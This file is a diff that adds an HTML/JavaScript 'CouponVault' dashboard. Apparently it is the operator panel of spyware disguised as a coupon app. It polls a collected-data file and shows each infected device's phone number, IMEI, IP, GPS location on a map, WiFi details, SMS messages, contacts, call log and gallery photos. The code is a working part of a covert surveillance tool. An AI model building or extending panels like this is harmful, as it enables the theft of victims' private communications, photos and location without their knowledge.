@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CouponVault Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            color: #fff;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            background-attachment: fixed;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+        }
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 32px;
+            width: 100%;
+            max-width: 1400px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        header { text-align: center; margin-bottom: 40px; }
+        header h1 { 
+            font-size: 3rem; 
+            font-weight: 700; 
+            background: linear-gradient(90deg, #fff, #b3b6ff); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+        }
+        header p { color: rgba(255,255,255,0.6); font-size: 1.1rem; }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+        .stat-card {
+            background: rgba(255, 255, 255, 0.07);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 24px;
+            border-radius: 16px;
+            text-align: center;
+            transition: transform 0.2s;
+        }
+        .stat-card:hover { transform: translateY(-5px); }
+        .stat-value { font-size: 3rem; font-weight: bold; color: #00ff88; text-shadow: 0 0 20px rgba(0, 255, 136, 0.3); }
+        .stat-label { color: rgba(255,255,255,0.5); margin-top: 8px; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; }
+
+        .table-container {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            overflow: hidden;
+        }
+        table { width: 100%; border-collapse: collapse; }
+        thead { background: rgba(0, 0, 0, 0.3); }
+        th { padding: 16px; text-align: left; color: rgba(255,255,255,0.6); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; }
+        td { padding: 16px; border-top: 1px solid rgba(255, 255, 255, 0.05); font-size: 1rem; white-space: nowrap; }
+        tbody tr { cursor: pointer; transition: background 0.2s; }
+        tbody tr:hover { background: rgba(79, 70, 229, 0.15); }
+        
+        .modal {
+            display: none; position: fixed; z-index: 1000; left: 0; top: 0;
+            width: 100%; height: 100%; overflow: auto;
+            background-color: rgba(0,0,0,0.8); backdrop-filter: blur(8px);
+        }
+        .modal-content {
+            background: rgba(20, 20, 35, 0.9); margin: 5% auto; padding: 30px;
+            border: 1px solid rgba(255,255,255,0.1); border-radius: 20px;
+            width: 80%; max-width: 700px; color: #fff;
+        }
+        .close-btn { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
+        .close-btn:hover { color: #fff; }
+        .data-section { margin-bottom: 20px; }
+        .data-section h3 { margin-bottom: 10px; color: #b3b6ff; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 5px; }
+        .data-item { background: rgba(255,255,255,0.05); padding: 10px; border-radius: 8px; margin-bottom: 8px; font-family: monospace; font-size: 0.9rem; }
+        
+        ::-webkit-scrollbar { height: 8px; width: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <div class="glass-panel">
+        <header>
+            <h1>CouponVault</h1>
+            <p>Device Intelligence Dashboard</p>
+        </header>
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-value" id="totalDevices">0</div>
+                <div class="stat-label">Total Installs</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="totalToday">0</div>
+                <div class="stat-label">Today's Pings</div>
+            </div>
+        </div>
+
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Device</th>
+                    </tr>
+                </thead>
+                <tbody id="dataTableBody"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <div id="dataModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn">&times;</span>
+            <h2 id="modalTitle">Device Details</h2>
+            <div id="modalBody"></div>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = "./collected_data.json";
+        let allData = [];
+
+        async function loadData() {
+            try {
+                const res = await fetch(API_URL + '?t=' + Date.now());
+                const text = await res.text();
+                let data = [];
+                
+                if (text.trim().startsWith('[')) {
+                    data = JSON.parse(text);
+                } else {
+                    const lines = text.trim().split('\n');
+                    for (let line of lines) {
+                        if (line.trim()) {
+                            try { data.push(JSON.parse(line)); } catch(e) {}
+                        }
+                    }
+                }
+
+                data.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+                allData = data;
+
+                document.getElementById('totalDevices').textContent = data.length;
+                const today = new Date().toISOString().split('T')[0];
+                document.getElementById('totalToday').textContent = data.filter(d => d.timestamp && d.timestamp.includes(today)).length;
+
+                const tbody = document.getElementById('dataTableBody');
+                tbody.innerHTML = '';
+
+                data.forEach((entry, index) => {
+                    const d = entry.device || {};
+                    const tr = document.createElement('tr');
+                    tr.onclick = () => showDetails(index);
+                    
+                    let lat = 'N/A', lon = 'N/A';
+                    if (d.latitude && d.latitude !== 'null' && typeof d.latitude === 'number') {
+                        lat = d.latitude.toFixed(4);
+                    }
+                    if (d.longitude && d.longitude !== 'null' && typeof d.longitude === 'number') {
+                        lon = d.longitude.toFixed(4);
+                    }
+                    
+                    tr.innerHTML = `
+                        <td>${entry.timestamp || 'N/A'}</td>
+                        <td>${d.device_brand || 'N/A'} ${d.device_model || ''} <br> <span style="font-size:0.8rem; color:rgba(255,255,255,0.4)">${lat}, ${lon}</span></td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            } catch (e) {
+                console.error('No data yet or failed to load:', e);
+            }
+        }
+
+        function showDetails(index) {
+            const entry = allData[index];
+            const d = entry.device || {};
+            const modal = document.getElementById('dataModal');
+            const body = document.getElementById('modalBody');
+            
+            let html = '';
+            
+            html += `<div class="data-section"><h3>Basic Info</h3>`;
+            html += `<div class="data-item">Phone: ${d.phone_number || 'N/A'}</div>`;
+            html += `<div class="data-item">IMEI: ${d.imei || 'N/A'}</div>`;
+            html += `<div class="data-item">IP: ${d.local_ip || 'N/A'}</div>`;
+            html += `<div class="data-item">Client IP: ${entry.client_ip || 'N/A'}</div>`;
+            html += `<div class="data-item">Location: ${d.latitude}, ${d.longitude}</div>`;
+            if (d.latitude && d.latitude !== 'null' && d.longitude && d.longitude !== 'null') {
+                html += `<div style="margin-top:10px; border-radius:10px; overflow:hidden; border: 1px solid rgba(255,255,255,0.1);">
+                    <iframe width="100%" height="250" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" 
+                    src="https://www.openstreetmap.org/export/embed.html?bbox=${d.longitude-0.01}%2C${d.latitude-0.01}%2C${d.longitude+0.01}%2C${d.latitude+0.01}&amp;layer=mapnik&amp;marker=${d.latitude}%2C${d.longitude}" style="filter: invert(90%) hue-rotate(180deg);"></iframe>
+                </div>`;
+            }
+            html += `</div>`;
+
+            if (d.wifi_info) {
+                html += `<div class="data-section"><h3>WiFi Info</h3>`;
+                html += `<div class="data-item">BSSID: ${d.wifi_info.bssid || 'N/A'}</div>`;
+                html += `<div class="data-item">SSID: ${d.wifi_info.ssid || 'N/A'}</div>`;
+                html += `<div class="data-item">Signal: ${d.wifi_info.signal_strength || 'N/A'} dBm</div>`;
+                html += `</div>`;
+            }
+
+            if (d.sms_list && d.sms_list.length > 0) {
+                html += `<div class="data-section"><h3>SMS (Last ${d.sms_list.length})</h3>`;
+                d.sms_list.forEach(sms => {
+                    html += `<div class="data-item"><strong>${sms.type}</strong> ${sms.address}: ${sms.body}</div>`;
+                });
+                html += `</div>`;
+            }
+
+            if (d.contacts && d.contacts.length > 0) {
+                html += `<div class="data-section"><h3>Contacts (First ${d.contacts.length})</h3>`;
+                d.contacts.forEach(c => {
+                    html += `<div class="data-item">${c.name}: ${c.number}</div>`;
+                });
+                html += `</div>`;
+            }
+
+            if (d.call_log && d.call_log.length > 0) {
+                html += `<div class="data-section"><h3>Call Log (Last ${d.call_log.length})</h3>`;
+                d.call_log.forEach(call => {
+                    html += `<div class="data-item"><strong>${call.type}</strong> ${call.number} (${call.duration}s)</div>`;
+                });
+                html += `</div>`;
+            }
+
+            if (d.gallery_uris && d.gallery_uris.length > 0) {
+                html += `<div class="data-section"><h3>Gallery (Last ${d.gallery_uris.length})</h3>`;
+                html += `<div style="display:flex; gap:10px; overflow-x:auto; padding-bottom:10px;">`;
+                d.gallery_uris.forEach(img => {
+                    if (img.base64) {
+                        html += `<div style="flex: 0 0 auto; background: rgba(0,0,0,0.3); padding: 5px; border-radius: 8px;">
+                                    <img src="${img.base64}" style="height: 150px; border-radius: 8px; object-fit: cover;">
+                                    <div style="font-size: 0.75rem; color: #aaa; text-align: center; margin-top: 4px; overflow:hidden; text-overflow:ellipsis; max-width: 150px; white-space: nowrap;">${img.name}</div>
+                                 </div>`;
+                    } else {
+                        html += `<div class="data-item">${img.name} - ${img.uri}</div>`;
+                    }
+                });
+                html += `</div></div>`;
+            }
+
+            body.innerHTML = html;
+            modal.style.display = "block";
+        }
+
+        document.querySelector('.close-btn').onclick = function() {
+            document.getElementById('dataModal').style.display = "none";
+        }
+        
+        window.onclick = function(event) {
+            if (event.target == document.getElementById('dataModal')) {
+                document.getElementById('dataModal').style.display = "none";
+            }
+        }
+
+        loadData();
+        setInterval(loadData, 5000);
+    </script>
+</body>
+</html>
